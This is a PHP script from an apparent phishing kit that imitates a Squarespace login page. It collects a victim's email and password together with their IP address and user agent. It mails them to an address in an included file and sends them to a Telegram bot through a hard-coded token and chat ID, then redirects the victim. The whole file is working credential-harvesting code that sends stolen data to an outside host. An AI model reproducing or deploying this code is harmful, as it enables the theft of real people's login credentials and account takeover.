<?php
if($_POST["LKRFDR"] != "" and $_POST["KLNDRR2"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------SQSpace Info-----------------------\n";
$message .= "Email            : ".$_POST['LKRFDR']."\n";
$message .= "Password           : ".$_POST['KLNDRR2']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- D3R3K --------------|\n";
$subject = "SQSpace Login| ".$_POST['LKRFDR']." | $ip";
include 'email.php';
{
mail("$to", "$send", "$subject", $message);
$token = "941831663:AAEBvTp0DeFlPQlXOnRC6CTv7K2RJTbIJCU";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=652972541&text=" . urlencode($message)."" );     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: index3.php");
}else{
header ("Location: index.php");
}

?>